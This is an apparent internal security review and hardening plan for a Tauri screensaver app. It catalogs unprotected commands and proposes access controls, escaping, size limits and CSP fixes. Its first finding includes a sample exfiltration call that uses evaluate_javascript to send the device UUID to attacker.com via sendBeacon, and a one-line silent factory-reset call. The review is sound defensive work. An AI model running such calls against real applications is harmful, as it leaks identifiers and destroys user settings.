# Security Analysis & Hardening

**Created:** 2026-04-23  
**Status:** Draft

---

## Context

The app loads remote content in three window types (options, screensaver, preview). All three can currently invoke every registered Tauri command without restriction. Several commands are dangerous — one executes arbitrary JavaScript in any window. This document catalogs the findings and specifies concrete fixes ordered by severity.

---

## Threat Model

| Asset | Value |
|-------|-------|
| User preferences (`options.json`) | Low — timing settings, no secrets |
| `instance_id` UUID | Medium — stable device identifier |
| App control surface (power, display, lock) | High — screensaver can be triggered/suppressed |
| Command execution inside other windows | Critical — arbitrary JS execution vector |

**Assumed attacker:** A page loaded in any remote window — either maliciously served, MITM'd over HTTPS, or a supply-chain compromise of the screensaver/options host domain.

---

## Findings

### F1 — `evaluate_javascript` has no access control *(Critical)*

**File:** `src-tauri/src/lib.rs` (command `evaluate_javascript`)

Any window can call this command with an arbitrary `script` string and any `label`. There is a `// TODO: Implement token validation when security is enabled` comment — it has never been implemented.

**Attack:**
```js
invoke('evaluate_javascript', {
  label: 'options',
  script: 'navigator.sendBeacon("https://attacker.com", navigator.id)'
})
```

Executes in the options window context. Exfiltrates instance UUID. Can also read DOM, call other commands, navigate the window.

**Fix options (choose one):**
- **Remove the command entirely** — nothing in the app currently calls it from a remote context; it exists as a debug utility
- **Restrict to dev builds only** — wrap in `#[cfg(debug_assertions)]` so it compiles out of release builds
- **Gate behind shared-key validation** — require the caller to pass the current `instance_id` as a proof of same-origin; validate server-side in the command

---

### F2 — All Tauri commands accessible from all remote windows *(High)*

**File:** `src-tauri/capabilities/*.json`

Tauri v2's ACL system allows custom commands to be listed in capability files and restricted by window. Currently, no custom commands appear in any capability file — they are accessible to every window implicitly.

**Sensitive commands callable by screensaver content today:**

| Command | Risk |
|---------|------|
| `factory_reset_options` | Wipes all user settings without confirmation |
| `set_options` | Alters timing (e.g. `startsIn: 0`) |
| `navigate_webview` | Redirects any window to an attacker URL |
| `create_preview_window` | Opens a new window loading any URL |
| `evaluate_javascript` | Arbitrary code in any window (see F1) |
| `activate_screensaver_command` | Forces screensaver on |

**Fix:** Define per-window command ACLs in capabilities. Add a `commands` section to each capability file listing only the commands that window legitimately needs.

Proposed ACL per window type:

| Window | Allowed commands |
|--------|-----------------|
| `main` (fallback) | `get_options`, `get_screensaver_status` |
| `options` | `get_options`, `set_options`, `factory_reset_options`, `preview_screensaver`, `open_options`, `get_screensaver_status` |
| `saver-*` | *(none — screensaver content needs no Tauri commands)* |
| `preview-*` | *(none)* |

Implementation: add to each `.json` in `src-tauri/capabilities/`:
```json
"commands": {
  "allow": ["plugin:core/invoke_specific_command"]
}
```

Note: Tauri v2's exact syntax for custom command allowlisting needs to be confirmed against the v2 ACL docs — the `tauri:allow-<command>` permission identifier pattern applies.

---

### F3 — `factory_reset_options` requires no confirmation from remote callers *(High)*

**File:** `src-tauri/src/lib.rs`

A remote page at the screensaver URL can silently wipe all user settings:
```js
await invoke('factory_reset_options')
```

No dialog, no audit log, no rate limit.

**Fix:** This is partially solved by F2 (restrict which windows can call it). Additionally:
- Emit a `factory-reset-performed` Tauri event so all windows are notified and can log it
- Consider requiring the caller to pass the current `instance_id` as confirmation token (prevents replay if a stale page tries to call it)

---

### F4 — `instance_id` not escaped in initialization script *(Medium)*

**File:** `src-tauri/src/lib.rs`, `build_init_script()`

```rust
fn build_init_script(instance_id: &str, app_name: &str) -> String {
    let safe_name = app_name.replace('\\', "\\\\").replace('\'', "\\'");
    // instance_id is used verbatim — NOT escaped
    format!("...value:'{}',..."  instance_id, ...)
}
```

`app_name` is escaped for single quotes but `instance_id` is not. The `instance_id` is a UUID (`xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx`) — it contains only hex digits and hyphens, so today this is safe. However:
- If the UUID generation were ever changed or the ID were loaded from an external source, injection would be possible
- Defense-in-depth: escape it anyway

**Fix:**
```rust
let safe_id = instance_id.replace('\\', "\\\\").replace('\'', "\\'");
// use safe_id in the format string
```

---

### F5 — `custom_options` JSON blob stored without size limit *(Medium)*

**File:** `src-tauri/src/lib.rs`, `set_options` command

`custom_options` is a `serde_json::Value` that accepts any object. No maximum size is enforced. An attacker who can call `set_options` (possible today, restricted after F2 fix) can write arbitrarily large data to `options.json`.

**Fix:** Add a size check in `validate_options`:
```rust
let custom_size = serde_json::to_string(&options.custom_options)
    .map(|s| s.len())
    .unwrap_or(0);
if custom_size > 10_000 {
    return Err("custom_options exceeds 10KB limit".to_string());
}
```

---

### F6 — CSP allows `unsafe-inline` scripts and unrestricted `connect-src` *(Medium)*

**File:** `src-tauri/tauri.conf.json`

```json
"script-src": "'self' 'unsafe-inline'",
"connect-src": "'self' https: http:"
```

`unsafe-inline` allows inline `<script>` and `onclick=` handlers. The main window is local-only so this is low-risk in practice, but it disables the browser's XSS defense layer.

`connect-src: https: http:` allows the main window to fetch from any domain — broader than needed.

**Fix:**
- Replace `unsafe-inline` with a nonce or remove it if no inline scripts are present (the app uses a bundled `main.js`)
- Narrow `connect-src` to `'self'` for the main window (it doesn't fetch external resources)
- Dynamically created windows (options, saver, preview) currently have no CSP — set per-window CSP on creation via `WebviewWindowBuilder`

---

### F7 — `navigate_webview` and `create_preview_window` accept arbitrary URLs *(Low-Medium)*

**File:** `src-tauri/src/lib.rs`

Both commands accept a URL string with no validation. A remote page can redirect any window or open a new window pointing to any URL.

**Fix:** After F2 restricts which windows can call these commands, validate the URL scheme in the commands themselves:

```rust
fn validate_allowed_url(url: &str) -> Result<(), String> {
    let parsed = url::Url::parse(url).map_err(|_| "Invalid URL".to_string())?;
    match parsed.scheme() {
        "https" | "http" => Ok(()),
        _ => Err(format!("URL scheme '{}' is not allowed", parsed.scheme())),
    }
}
```

---

## Protections Already in Place

| Protection | Notes |
|------------|-------|
| Numeric range validation in `validate_options` | `starts_in`, `display_off_in`, `require_pass_in` bounds-checked |
| Identity fields preserved in `set_options` | `saver_url`, `app_name`, `app_description` come from state, not caller |
| Updater uses public key verification | Endpoint and key defined in `tauri.conf.json` |
| `app_name` escaped in init script | Single quotes and backslashes escaped before JS injection |
| `instance_id` is a UUID | Hex-only format limits injection risk (see F4 for defense-in-depth) |
| Screensaver URL is env-only | Cannot be changed at runtime by remote content |

---

## Remediation Plan

### Phase 1 — Critical (do first)

1. **Restrict or remove `evaluate_javascript`** — wrap in `#[cfg(debug_assertions)]` so it is absent from release builds. This eliminates the critical arbitrary-execution vector.

2. **Add command ACLs to capability files** — add `commands.allow` to `options.json`, `saver.json`, and `desktop.json`. Screensaver and preview windows get empty allow lists. This closes the bulk of the command-access surface in one change.

### Phase 2 — High

3. **Escape `instance_id` in `build_init_script`** — one-line defensive fix.

4. **Add `factory-reset-performed` event emission** in `factory_reset_options` — provides audit trail.

5. **Validate URL schemes** in `navigate_webview` and `create_preview_window`.

### Phase 3 — Medium

6. **Add `custom_options` size limit** in `validate_options`.

7. **Tighten CSP** — remove `unsafe-inline`, narrow `connect-src`, add per-window CSP to dynamically created windows.

---

## Files to Modify

| File | Change |
|------|--------|
| `src-tauri/src/lib.rs` | Wrap `evaluate_javascript` in `#[cfg(debug_assertions)]`; escape `instance_id` in `build_init_script`; add custom_options size check in `validate_options`; emit `factory-reset-performed` event |
| `src-tauri/capabilities/options.json` | Add `commands.allow` with options-window command set |
| `src-tauri/capabilities/saver.json` | Add `commands.allow: []` — deny all custom commands |
| `src-tauri/capabilities/desktop.json` | Review; restrict to updater only |
| `src-tauri/tauri.conf.json` | Harden CSP: remove `unsafe-inline`, narrow `connect-src` |
| `src-tauri/src/lib.rs` | Add URL scheme validation in `navigate_webview` and `create_preview_window` |

---

## Verification

- [ ] `evaluate_javascript` command absent from release binary (`cargo build --release`; check binary strings)
- [ ] Screensaver window cannot call `factory_reset_options` (test from browser console in saver window — should get permission denied)
- [ ] `factory_reset_options` from options window still works
- [ ] `build_init_script` with a UUID containing special chars is safe (add unit test)
- [ ] `set_options` with `customOptions` > 10KB returns error
- [ ] `navigate_webview` with `file://` scheme returns error
- [ ] CSP blocks inline scripts in main window (verify in devtools)
- [ ] `cargo check` passes with no new warnings
